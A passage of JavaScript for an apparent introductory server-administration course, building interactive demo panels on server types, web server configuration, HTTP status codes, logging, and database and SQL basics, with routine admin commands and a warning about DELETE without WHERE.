        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">TYPES</span><span class="demo-title">Server Categories & Functions</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="types1Btns">
                <button class="demo-btn demo-btn-sm active" data-t="app">Application</button>
                <button class="demo-btn demo-btn-sm" data-t="file">File & Print</button>
                <button class="demo-btn demo-btn-sm" data-t="proxy">Proxy</button>
                <button class="demo-btn demo-btn-sm" data-t="special">Specialized</button>
            </div>
            <div id="types1Out" style="background:#1a1a2e;color:#ffd700;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            app: 'APPLICATION SERVERS:\n\n┌─────────────────────────────────────┐\n│  Client → App Server → Database    │\n└─────────────────────────────────────┘\n\n🔷 Java Application Servers:\n   • Apache Tomcat\n   • JBoss/WildFly\n   • WebLogic, WebSphere\n\n🟢 Node.js Servers:\n   • Express.js apps\n   • Real-time applications\n\n🐘 PHP Servers:\n   • Apache + mod_php\n   • PHP-FPM + Nginx\n\n🐍 Python Servers:\n   • Gunicorn, uWSGI\n   • Django, Flask apps',
            file: 'FILE & PRINT SERVERS:\n\n📁 FILE SERVERS:\n\nWindows (SMB/CIFS):\n  \\\\server\\share\n  • Active Directory integration\n  • NTFS permissions\n\nLinux (NFS):\n  mount server:/export /mnt\n  • Unix permissions\n  • NFSv4 with Kerberos\n\nSamba (Cross-platform):\n  • Linux serving Windows clients\n  • File & printer sharing\n\n🖨️ PRINT SERVERS:\n  • CUPS (Linux)\n  • Windows Print Server\n  • IPP (Internet Printing Protocol)',
            proxy: 'PROXY SERVERS:\n\n🔄 Forward Proxy:\n┌────────┐   ┌───────┐   ┌────────┐\n│ Client │──▶│ Proxy │──▶│Internet│\n└────────┘   └───────┘   └────────┘\n  • Hide client IP\n  • Content filtering\n  • Caching\n\n🔄 Reverse Proxy:\n┌────────┐   ┌───────┐   ┌────────┐\n│Internet│──▶│ Proxy │──▶│ Server │\n└────────┘   └───────┘   └────────┘\n  • Load balancing\n  • SSL termination\n  • Hide backend servers\n  • Examples: Nginx, HAProxy',
            special: 'SPECIALIZED SERVERS:\n\n⏰ Time Server (NTP):\n   • Synchronizes clocks\n   • Stratum hierarchy\n\n🎮 Game Server:\n   • Low latency critical\n   • High bandwidth\n   • Dedicated or cloud\n\n📡 Media Server:\n   • Streaming content\n   • Transcoding\n   • Plex, Jellyfin\n\n🔑 License Server:\n   • Software licensing\n   • Floating licenses\n   • FlexLM, RLM\n\n🤖 Build Server:\n   • CI/CD pipelines\n   • Jenkins, GitLab CI'
        };
        $('#types1Out').textContent = data.app;
        $$('#types1Btns .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#types1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#types1Out').textContent = data[b.dataset.t];
            };
        });
    }

    // C7L5: Server Challenges
    function demoServerChallenges(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">CHALLENGES</span><span class="demo-title">Server Administration Challenges</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="chal1Btns">
                <button class="demo-btn demo-btn-sm active" data-c="uptime">Uptime</button>
                <button class="demo-btn demo-btn-sm" data-c="scale">Scaling</button>
                <button class="demo-btn demo-btn-sm" data-c="security">Security</button>
                <button class="demo-btn demo-btn-sm" data-c="cost">Cost</button>
            </div>
            <div id="chal1Out" style="background:#2d1b1b;color:#ff6b6b;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            uptime: 'UPTIME CHALLENGES:\n\n📊 Availability Targets:\n   99%     = 3.65 days downtime/year\n   99.9%   = 8.76 hours downtime/year\n   99.99%  = 52.6 minutes/year\n   99.999% = 5.26 minutes/year (five 9s)\n\n⚠️ Common Causes of Downtime:\n   • Hardware failures\n   • Software bugs\n   • Human error (misconfig)\n   • Security incidents\n   • Power outages\n   • Network issues\n\n✓ Solutions:\n   • Redundancy (N+1, 2N)\n   • Failover clusters\n   • UPS + generators\n   • Change management',
            scale: 'SCALING CHALLENGES:\n\n📈 Vertical Scaling (Scale Up):\n   Add more resources to ONE server\n   ├─ More CPU, RAM, storage\n   ├─ Easier to implement\n   └─ Has physical limits\n\n📊 Horizontal Scaling (Scale Out):\n   Add MORE servers\n   ├─ Load balancing required\n   ├─ Application must support it\n   └─ Theoretically unlimited\n\n⚠️ Problems:\n   • Session management\n   • Data synchronization\n   • Increased complexity\n   • Cost management\n\n✓ Solutions:\n   • Auto-scaling (cloud)\n   • Containerization\n   • Microservices',
            security: 'SECURITY CHALLENGES:\n\n🎯 Attack Surface:\n   • Public-facing services\n   • Management interfaces\n   • Supply chain (updates)\n\n🔓 Common Vulnerabilities:\n   • Unpatched software\n   • Default credentials\n   • Misconfigurations\n   • Weak encryption\n\n🛡️ Defense Strategies:\n   ✓ Patch management\n   ✓ Firewall rules\n   ✓ IDS/IPS systems\n   ✓ Log monitoring\n   ✓ Access control (least privilege)\n   ✓ Encryption (TLS, disk)\n   ✓ Regular audits\n   ✓ Penetration testing',
            cost: 'COST CHALLENGES:\n\n💰 Capital Expenditure (CapEx):\n   • Hardware purchase\n   • Data center space\n   • Initial setup\n\n💸 Operating Expenditure (OpEx):\n   • Power (servers run hot!)\n   • Cooling (40% of power)\n   • Staff salaries\n   • Licensing fees\n   • Maintenance contracts\n   • Network bandwidth\n\n📊 TCO Comparison:\n   On-premises: High CapEx, Lower OpEx\n   Cloud: Low CapEx, Higher OpEx\n\n✓ Cost Optimization:\n   • Virtualization\n   • Power-efficient hardware\n   • Cloud burst for peaks\n   • Open source software'
        };
        $('#chal1Out').textContent = data.uptime;
        $$('#chal1Btns .demo-btn').forEach(b => {
            if(b.dataset.c) b.onclick = () => {
                $$('#chal1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#chal1Out').textContent = data[b.dataset.c];
            };
        });
    }

    // C7L6: Server Connectivity
    function demoServerConnectivity(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">NETWORK</span><span class="demo-title">Server Network Connectivity</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="conn1Btns">
                <button class="demo-btn demo-btn-sm active" data-n="nic">NICs</button>
                <button class="demo-btn demo-btn-sm" data-n="bond">Bonding</button>
                <button class="demo-btn demo-btn-sm" data-n="vlan">VLANs</button>
                <button class="demo-btn demo-btn-sm" data-n="mgmt">Management</button>
            </div>
            <div id="conn1Out" style="background:#1a2e1a;color:#00ff88;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            nic: 'SERVER NETWORK INTERFACES:\n\n🔌 Speeds:\n   • 1 GbE  - Basic servers\n   • 10 GbE - Standard today\n   • 25 GbE - Modern servers\n   • 40/100 GbE - High performance\n\n📊 Multiple NICs:\n   Server typically has 2-8 ports\n   ├─ Production traffic\n   ├─ Management network\n   ├─ Storage network (iSCSI)\n   └─ Backup network\n\n$ ip link show\n1: lo: <LOOPBACK,UP>\n2: eth0: <BROADCAST,UP> ← Production\n3: eth1: <BROADCAST,UP> ← Management\n4: eth2: <BROADCAST,UP> ← Storage',
            bond: 'NIC BONDING/TEAMING:\n\n┌───────────────────────────────────────┐\n│     NIC Bonding (Link Aggregation)   │\n│                                       │\n│   eth0 ─┐                            │\n│         ├──▶ bond0 (2x bandwidth)    │\n│   eth1 ─┘    + failover              │\n└───────────────────────────────────────┘\n\nBonding Modes:\n  0 - Round-robin (load balance)\n  1 - Active-backup (failover)\n  2 - XOR (hash-based)\n  4 - 802.3ad (LACP) ← Most common\n  6 - Adaptive load balancing\n\n# Linux bonding config\n$ cat /etc/modprobe.d/bonding.conf\noptions bonding mode=4 miimon=100',
            vlan: 'VLANs ON SERVERS:\n\n┌──────────────────────────────────────┐\n│ Physical NIC → Multiple VLANs       │\n│                                      │\n│   eth0.10 ──▶ VLAN 10 (Production)  │\n│   eth0.20 ──▶ VLAN 20 (Management)  │\n│   eth0.30 ──▶ VLAN 30 (Storage)     │\n└──────────────────────────────────────┘\n\nBenefits:\n  ✓ Reduce physical NICs\n  ✓ Network segmentation\n  ✓ Security isolation\n\n# Linux VLAN config\n$ ip link add link eth0 name eth0.10 \\\n    type vlan id 10\n$ ip addr add 10.10.10.5/24 dev eth0.10',
            mgmt: 'OUT-OF-BAND MANAGEMENT:\n\n┌──────────────────────────────────────┐\n│ Remote management when OS is down   │\n└──────────────────────────────────────┘\n\n🔧 Technologies:\n   • iLO (HP)\n   • iDRAC (Dell)\n   • IMM (Lenovo)\n   • IPMI (Standard)\n\nCapabilities:\n   ✓ Power on/off/reboot\n   ✓ Virtual console (KVM)\n   ✓ Virtual media (ISO mount)\n   ✓ Hardware monitoring\n   ✓ BIOS configuration\n   ✓ Alert notifications\n\n⚠️ Security: Always on separate VLAN!'
        };
        $('#conn1Out').textContent = data.nic;
        $$('#conn1Btns .demo-btn').forEach(b => {
            if(b.dataset.n) b.onclick = () => {
                $$('#conn1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#conn1Out').textContent = data[b.dataset.n];
            };
        });
    }

    // C7L7-L12: Web Server Lessons (unique demos)
    function demoWebServerIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">WEB</span><span class="demo-title">Web Server Introduction</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="web1Btns">
                <button class="demo-btn demo-btn-sm active" data-w="purpose">Purpose</button>
                <button class="demo-btn demo-btn-sm" data-w="popular">Popular Servers</button>
                <button class="demo-btn demo-btn-sm" data-w="market">Market Share</button>
            </div>
            <div id="web1Out" style="background:#0d1117;color:#58a6ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            purpose: 'WEB SERVER PURPOSE:\n\n🌐 A web server:\n   • Listens for HTTP/HTTPS requests\n   • Serves web pages and files\n   • Runs web applications\n   • Handles thousands of connections\n\nSimple Flow:\n  1. Browser requests: GET /index.html\n  2. Server finds the file\n  3. Server sends response\n  4. Browser renders page\n\nPorts:\n  HTTP  → Port 80\n  HTTPS → Port 443',
            popular: 'POPULAR WEB SERVERS:\n\n🔸 Apache HTTP Server:\n   • Open source, mature\n   • Modules for everything\n   • .htaccess for per-dir config\n\n🔸 Nginx:\n   • High performance\n   • Reverse proxy/load balancer\n   • Low memory usage\n\n🔸 Microsoft IIS:\n   • Windows integration\n   • .NET applications\n   • GUI management\n\n🔸 LiteSpeed:\n   • Apache compatible\n   • Faster performance\n   • Built-in caching',
            market: 'WEB SERVER MARKET SHARE (2024):\n\n┌──────────────┬─────────────────────┐\n│ Server       │ Share               │\n├──────────────┼─────────────────────┤\n│ Nginx        │ ████████████ 34%   │\n│ Apache       │ ██████████ 30%     │\n│ Cloudflare   │ █████ 15%          │\n│ LiteSpeed    │ ███ 10%            │\n│ IIS          │ ██ 5%              │\n│ Other        │ ██ 6%              │\n└──────────────┴─────────────────────┘\n\nTrend: Nginx gaining, Apache declining'
        };
        $('#web1Out').textContent = data.purpose;
        $$('#web1Btns .demo-btn').forEach(b => {
            if(b.dataset.w) b.onclick = () => {
                $$('#web1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#web1Out').textContent = data[b.dataset.w];
            };
        });
    }

    function demoWhatAreWebServers(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">CONCEPT</span><span class="demo-title">What Are Web Servers?</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="what1Btns">
                <button class="demo-btn demo-btn-sm active" data-q="def">Definition</button>
                <button class="demo-btn demo-btn-sm" data-q="hw">Hardware vs Software</button>
                <button class="demo-btn demo-btn-sm" data-q="stack">Web Stack</button>
            </div>
            <div id="what1Out" style="background:#1a1a2e;color:#00d4ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            def: 'DEFINITION - WEB SERVER:\n\n📖 Two meanings:\n\n1️⃣ SOFTWARE:\n   Program that handles HTTP requests\n   Examples: Apache, Nginx, IIS\n\n2️⃣ HARDWARE:\n   Physical machine running web software\n   Houses the web server software\n\nTypically "web server" means BOTH:\n  Physical machine + Software running on it\n\n🌐 Primary function:\n   Serve content over HTTP/HTTPS protocol',
            hw: 'HARDWARE vs SOFTWARE WEB SERVER:\n\n┌─────────────────────────────────────┐\n│        HARDWARE (Machine)           │\n│  ┌───────────────────────────────┐ │\n│  │   SOFTWARE (Apache/Nginx)     │ │\n│  │  ┌─────────────────────────┐ │ │\n│  │  │   Website Files         │ │ │\n│  │  │   (HTML, CSS, JS)       │ │ │\n│  │  └─────────────────────────┘ │ │\n│  └───────────────────────────────┘ │\n└─────────────────────────────────────┘\n\n💻 Hardware provides:\n   • Computing power, memory, storage\n\n⚙️ Software provides:\n   • HTTP protocol handling\n   • Request routing\n   • Security features',
            stack: 'WEB STACK (LAMP/LEMP):\n\n┌─────────────────────────────────────┐\n│         L - Linux (OS)              │\n├─────────────────────────────────────┤\n│         A/E - Apache/nginx          │\n│         (Web Server)                │\n├─────────────────────────────────────┤\n│         M - MySQL/MariaDB           │\n│         (Database)                  │\n├─────────────────────────────────────┤\n│         P - PHP/Python/Perl         │\n│         (Programming Language)      │\n└─────────────────────────────────────┘\n\nModern stacks: MEAN, MERN (Node.js)'
        };
        $('#what1Out').textContent = data.def;
        $$('#what1Btns .demo-btn').forEach(b => {
            if(b.dataset.q) b.onclick = () => {
                $$('#what1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#what1Out').textContent = data[b.dataset.q];
            };
        });
    }

    function demoHowWebServersWork(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">FLOW</span><span class="demo-title">How Web Servers Work</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="how1Btns">
                <button class="demo-btn demo-btn-sm active" data-h="request">Request Cycle</button>
                <button class="demo-btn demo-btn-sm" data-h="static">Static Content</button>
                <button class="demo-btn demo-btn-sm" data-h="dynamic">Dynamic Content</button>
            </div>
            <div id="how1Out" style="background:#0d1117;color:#7ee787;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            request: 'HTTP REQUEST CYCLE:\n\n1. 🌐 User types URL in browser\n   ↓\n2. 🔍 DNS resolves domain → IP address\n   ↓\n3. 📡 TCP connection established (port 80/443)\n   ↓\n4. 📨 Browser sends HTTP request:\n   GET /page.html HTTP/1.1\n   Host: example.com\n   ↓\n5. ⚙️ Server processes request\n   ↓\n6. 📤 Server sends HTTP response:\n   HTTP/1.1 200 OK\n   Content-Type: text/html\n   <html>...</html>\n   ↓\n7. 🖼️ Browser renders page',
            static: 'STATIC CONTENT SERVING:\n\n┌─────────────────────────────────────┐\n│ Request: GET /logo.png              │\n└───────────────┬─────────────────────┘\n                ↓\n┌─────────────────────────────────────┐\n│ Web Server checks document root:    │\n│ /var/www/html/logo.png              │\n└───────────────┬─────────────────────┘\n                ↓\n┌─────────────────────────────────────┐\n│ File found → Read from disk         │\n│ File not found → 404 Error          │\n└───────────────┬─────────────────────┘\n                ↓\n┌─────────────────────────────────────┐\n│ Response: 200 OK + file content     │\n└─────────────────────────────────────┘\n\n⚡ Very fast - direct disk read',
            dynamic: 'DYNAMIC CONTENT GENERATION:\n\n┌─────────────────────────────────────┐\n│ Request: GET /user/profile          │\n└───────────────┬─────────────────────┘\n                ↓\n┌─────────────────────────────────────┐\n│ Web Server → Application Server     │\n│ (PHP, Python, Node.js, Java)        │\n└───────────────┬─────────────────────┘\n                ↓\n┌─────────────────────────────────────┐\n│ App queries database                │\n│ SELECT * FROM users WHERE id=123    │\n└───────────────┬─────────────────────┘\n                ↓\n┌─────────────────────────────────────┐\n│ App generates HTML with user data   │\n│ Response sent to browser            │\n└─────────────────────────────────────┘'
        };
        $('#how1Out').textContent = data.request;
        $$('#how1Btns .demo-btn').forEach(b => {
            if(b.dataset.h) b.onclick = () => {
                $$('#how1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#how1Out').textContent = data[b.dataset.h];
            };
        });
    }

    function demoWebServerAnalytics(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">ANALYTICS</span><span class="demo-title">Web Server Analytics & Logging</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="ana1Btns">
                <button class="demo-btn demo-btn-sm active" data-a="access">Access Logs</button>
                <button class="demo-btn demo-btn-sm" data-a="error">Error Logs</button>
                <button class="demo-btn demo-btn-sm" data-a="tools">Analytics Tools</button>
            </div>
            <div id="ana1Out" style="background:#1e1e1e;color:#ce9178;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            access: 'ACCESS LOG FORMAT (Combined):\n\n192.168.1.100 - john [10/Feb/2024:13:55:36] \\\n  "GET /index.html HTTP/1.1" 200 2326 \\\n  "https://google.com" "Mozilla/5.0..."\n\nFields:\n  • IP Address: 192.168.1.100\n  • User: john (if authenticated)\n  • Timestamp: [10/Feb/2024:13:55:36]\n  • Request: GET /index.html HTTP/1.1\n  • Status Code: 200 (OK)\n  • Bytes Sent: 2326\n  • Referer: https://google.com\n  • User-Agent: Browser info\n\nLocation: /var/log/nginx/access.log',
            error: 'ERROR LOG EXAMPLES:\n\n[error] File not found: /var/www/404.html\n[warn] SSL certificate expires in 30 days\n[crit] Out of memory, killing process\n[alert] Too many open files\n\nSeverity Levels:\n  emerg  → System unusable\n  alert  → Immediate action needed\n  crit   → Critical conditions\n  error  → Error conditions\n  warn   → Warning conditions\n  notice → Normal but significant\n  info   → Informational\n  debug  → Debug messages\n\nLocation: /var/log/nginx/error.log',
            tools: 'WEB ANALYTICS TOOLS:\n\n📊 Server-Side:\n   • GoAccess (real-time log analyzer)\n   • AWStats (log file analyzer)\n   • Webalizer (legacy)\n\n📈 Third-Party:\n   • Google Analytics\n   • Matomo (self-hosted)\n   • Plausible (privacy-focused)\n\n📉 Metrics to Track:\n   • Page views / Unique visitors\n   • Bandwidth usage\n   • Response times\n   • Error rates (4xx, 5xx)\n   • Top pages / referrers\n   • Geographic distribution\n\n# Real-time with GoAccess\ngoaccess /var/log/nginx/access.log'
        };
        $('#ana1Out').textContent = data.access;
        $$('#ana1Btns .demo-btn').forEach(b => {
            if(b.dataset.a) b.onclick = () => {
                $$('#ana1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#ana1Out').textContent = data[b.dataset.a];
            };
        });
    }

    function demoWebServerErrors(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">ERRORS</span><span class="demo-title">HTTP Status Codes & Errors</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="err1Btns">
                <button class="demo-btn demo-btn-sm active" data-e="2xx">2xx Success</button>
                <button class="demo-btn demo-btn-sm" data-e="3xx">3xx Redirect</button>
                <button class="demo-btn demo-btn-sm" data-e="4xx">4xx Client</button>
                <button class="demo-btn demo-btn-sm" data-e="5xx">5xx Server</button>
            </div>
            <div id="err1Out" style="background:#2d1b1b;color:#f97583;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            '2xx': '2xx SUCCESS CODES:\n\n✓ 200 OK\n  Standard success response\n\n✓ 201 Created\n  Resource created (POST success)\n\n✓ 204 No Content\n  Success but no body (DELETE)\n\n✓ 206 Partial Content\n  Range request (video streaming)\n\nExample Response:\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1234\n\n<html>...</html>',
            '3xx': '3xx REDIRECT CODES:\n\n↪ 301 Moved Permanently\n  Resource URL changed forever\n  SEO: passes link juice\n\n↪ 302 Found (Temporary)\n  Temporary redirect\n  Browser doesn\'t cache\n\n↪ 304 Not Modified\n  Use cached version\n  Saves bandwidth\n\n↪ 307 Temporary Redirect\n  Like 302, preserves method\n\n↪ 308 Permanent Redirect\n  Like 301, preserves method\n\nExample:\nHTTP/1.1 301 Moved Permanently\nLocation: https://new-url.com/',
            '4xx': '4xx CLIENT ERROR CODES:\n\n❌ 400 Bad Request\n   Malformed request syntax\n\n❌ 401 Unauthorized\n   Authentication required\n\n❌ 403 Forbidden\n   Access denied (even if authenticated)\n\n❌ 404 Not Found\n   Resource doesn\'t exist\n\n❌ 405 Method Not Allowed\n   Wrong HTTP method\n\n❌ 429 Too Many Requests\n   Rate limited\n\n⚠️ Client\'s fault - fix the request',
            '5xx': '5xx SERVER ERROR CODES:\n\n💥 500 Internal Server Error\n   Generic server error\n   Check server logs!\n\n💥 502 Bad Gateway\n   Upstream server error\n   Proxy/load balancer issue\n\n💥 503 Service Unavailable\n   Server overloaded or maintenance\n\n💥 504 Gateway Timeout\n   Upstream server timeout\n\n💥 507 Insufficient Storage\n   Disk full\n\n⚠️ Server\'s fault - check logs:\ntail -f /var/log/nginx/error.log'
        };
        $('#err1Out').textContent = data['2xx'];
        $$('#err1Btns .demo-btn').forEach(b => {
            if(b.dataset.e) b.onclick = () => {
                $$('#err1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#err1Out').textContent = data[b.dataset.e];
            };
        });
    }

    function demoWebServerConfig(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">CONFIG</span><span class="demo-title">Web Server Configuration</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="cfg1Btns">
                <button class="demo-btn demo-btn-sm active" data-c="nginx">Nginx</button>
                <button class="demo-btn demo-btn-sm" data-c="apache">Apache</button>
                <button class="demo-btn demo-btn-sm" data-c="ssl">SSL/TLS</button>
                <button class="demo-btn demo-btn-sm" data-c="vhost">Virtual Hosts</button>
            </div>
            <div id="cfg1Out" style="background:#0d1117;color:#79c0ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            nginx: 'NGINX CONFIGURATION:\n\n# /etc/nginx/sites-available/default\nserver {\n    listen 80;\n    server_name example.com;\n    root /var/www/html;\n    index index.html;\n\n    location / {\n        try_files $uri $uri/ =404;\n    }\n\n    location /api {\n        proxy_pass http'+'://localhost:3000;\n    }\n}\n\n# Test & reload\nnginx -t && systemctl reload nginx',
            apache: 'APACHE CONFIGURATION:\n\n# /etc/apache2/sites-available/000-default.conf\n<VirtualHost *:80>\n    ServerName example.com\n    DocumentRoot /var/www/html\n\n    <Directory /var/www/html>\n        AllowOverride All\n        Require all granted\n    </Directory>\n\n    ErrorLog ${APACHE_LOG_DIR}/error.log\n    CustomLog ${APACHE_LOG_DIR}/access.log combined\n</VirtualHost>\n\n# Enable site & reload\na2ensite example.com\nsystemctl reload apache2',
            ssl: 'SSL/TLS CONFIGURATION (Nginx):\n\nserver {\n    listen 443 ssl http2;\n    server_name example.com;\n\n    ssl_certificate /etc/ssl/cert.pem;\n    ssl_certificate_key /etc/ssl/key.pem;\n\n    # Modern settings\n    ssl_protocols TLSv1.2 TLSv1.3;\n    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:...;\n    ssl_prefer_server_ciphers off;\n\n    # HSTS\n    add_header Strict-Transport-Security\n        "max-age=31536000" always;\n}\n\n# Free SSL: Let\'s Encrypt + Certbot\ncertbot --nginx -d example.com',
            vhost: 'VIRTUAL HOSTS (Multiple Sites):\n\n# One IP → Multiple websites\n\n192.168.1.10 ─┬─▶ site1.com\n              ├─▶ site2.com\n              └─▶ site3.com\n\nNginx (server blocks):\nserver {\n    server_name site1.com;\n    root /var/www/site1;\n}\nserver {\n    server_name site2.com;\n    root /var/www/site2;\n}\n\nApache (VirtualHost):\n<VirtualHost *:80>\n    ServerName site1.com\n    DocumentRoot /var/www/site1\n</VirtualHost>'
        };
        $('#cfg1Out').textContent = data.nginx;
        $$('#cfg1Btns .demo-btn').forEach(b => {
            if(b.dataset.c) b.onclick = () => {
                $$('#cfg1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#cfg1Out').textContent = data[b.dataset.c];
            };
        });
    }

    // C7L13-L16: Database Server Lessons (unique demos)
    function demoDBServerIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">DATABASE</span><span class="demo-title">Database Server Introduction</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dbi1Btns">
                <button class="demo-btn demo-btn-sm active" data-d="what">What is a DB Server?</button>
                <button class="demo-btn demo-btn-sm" data-d="types">Types</button>
                <button class="demo-btn demo-btn-sm" data-d="popular">Popular Databases</button>
            </div>
            <div id="dbi1Out" style="background:#1e1e1e;color:#d4d4d4;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS A DATABASE SERVER?\n\n🗄️ A specialized server that:\n   • Stores structured data\n   • Processes queries (SQL)\n   • Manages concurrent access\n   • Ensures data integrity\n   • Handles transactions (ACID)\n\nComponents:\n  ┌─────────────────────────────────┐\n  │ Database Engine (MySQL, Postgres)│\n  │ ┌───────────────────────────┐   │\n  │ │ Query Processor           │   │\n  │ │ Storage Engine            │   │\n  │ │ Transaction Manager       │   │\n  │ │ Buffer/Cache Manager      │   │\n  │ └───────────────────────────┘   │\n  └─────────────────────────────────┘',
            types: 'DATABASE TYPES:\n\n📊 RELATIONAL (SQL):\n   Tables with rows & columns\n   Relationships via foreign keys\n   Examples: MySQL, PostgreSQL, Oracle\n   Use: Structured data, transactions\n\n📄 DOCUMENT (NoSQL):\n   JSON/BSON documents\n   Flexible schema\n   Examples: MongoDB, CouchDB\n   Use: Unstructured data, rapid dev\n\n🔑 KEY-VALUE:\n   Simple key → value pairs\n   Extremely fast\n   Examples: Redis, Memcached\n   Use: Caching, sessions\n\n📈 GRAPH:\n   Nodes and relationships\n   Examples: Neo4j, Amazon Neptune\n   Use: Social networks, recommendations',
            popular: 'POPULAR DATABASE SERVERS:\n\n🔷 MySQL/MariaDB:\n   • Most popular open source\n   • LAMP stack standard\n   • Easy to learn\n\n🐘 PostgreSQL:\n   • Advanced features\n   • JSON support\n   • Enterprise-grade\n\n🔶 Oracle Database:\n   • Enterprise standard\n   • Expensive licensing\n   • High availability\n\n🟦 Microsoft SQL Server:\n   • Windows integration\n   • .NET ecosystem\n   • Good BI tools\n\n🍃 MongoDB:\n   • Document database leader\n   • Developer-friendly\n   • Horizontal scaling'
        };
        $('#dbi1Out').textContent = data.what;
        $$('#dbi1Btns .demo-btn').forEach(b => {
            if(b.dataset.d) b.onclick = () => {
                $$('#dbi1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#dbi1Out').textContent = data[b.dataset.d];
            };
        });
    }

    function demoDatabaseLogic(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">SQL</span><span class="demo-title">Database Logic & SQL Basics</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="sql1Btns">
                <button class="demo-btn demo-btn-sm active" data-s="crud">CRUD Operations</button>
                <button class="demo-btn demo-btn-sm" data-s="joins">JOINs</button>
                <button class="demo-btn demo-btn-sm" data-s="index">Indexes</button>
            </div>
            <div id="sql1Out" style="background:#0d1117;color:#a5d6ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            crud: 'CRUD OPERATIONS:\n\n📝 CREATE (INSERT):\nINSERT INTO users (name, email)\nVALUES (\'Alice\', \'alice@example.com\');\n\n📖 READ (SELECT):\nSELECT * FROM users WHERE age > 21;\n\n✏️ UPDATE:\nUPDATE users SET email = \'new@mail.com\'\nWHERE id = 1;\n\n🗑️ DELETE:\nDELETE FROM users WHERE id = 1;\n\n⚠️ Always use WHERE clause!\n   DELETE FROM users; ← Deletes ALL!',
